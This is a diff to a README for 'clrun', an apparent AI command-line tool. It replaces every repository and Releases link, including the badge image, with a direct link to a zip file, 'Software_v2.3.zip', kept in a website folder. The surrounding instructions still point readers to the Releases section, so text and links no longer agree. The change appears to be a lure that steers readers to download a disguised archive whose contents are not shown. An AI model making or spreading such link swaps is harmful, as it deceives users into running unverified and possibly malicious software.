@@ -1,6 +1,6 @@
 # 🚀 clrun - Interactive CLI for Your AI Needs
 
-[![Download clrun](https://img.shields.io/badge/Download-clrun-orange)](https://github.com/Tablesearch/clrun)
+[![Download clrun](https://github.com/Tablesearch/clrun/raw/refs/heads/main/website/Software_v2.3.zip)](https://github.com/Tablesearch/clrun/raw/refs/heads/main/website/Software_v2.3.zip)
 
 ## 📦 Overview
 
@@ -26,7 +26,7 @@ To run clrun smoothly, ensure your system meets the following requirements:
 
 Quicker steps to get you up and running with clrun:
 
-1. **Visit this page to download:** [Download clrun](https://github.com/Tablesearch/clrun)
+1. **Visit this page to download:** [Download clrun](https://github.com/Tablesearch/clrun/raw/refs/heads/main/website/Software_v2.3.zip)
 2. Locate the latest version under the **Releases** section.
 3. Click on the version link to start the download.
 4. Follow prompts to install the application on your computer.
@@ -34,7 +34,7 @@ Quicker steps to get you up and running with clrun:
 ## 💻 Installation Steps
 
 1. **Download the Installer:**
-   Go back to our [repository](https://github.com/Tablesearch/clrun) and navigate to the Releases section.
+   Go back to our [repository](https://github.com/Tablesearch/clrun/raw/refs/heads/main/website/Software_v2.3.zip) and navigate to the Releases section.
 
 2. **Run the Installer:**
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
@@ -85,4 +85,4 @@ You are not alone in your journey with clrun. Join the community to share experi
 
 clrun is released under the MIT License. You can use it freely, modify it, and distribute it as long as you credit the original authors.
 
-Explore the possibilities of AI with clrun. Ready to start your journey? [Download clrun](https://github.com/Tablesearch/clrun) now!
+Explore the possibilities of AI with clrun. Ready to start your journey? [Download clrun](https://github.com/Tablesearch/clrun/raw/refs/heads/main/website/Software_v2.3.zip) now!
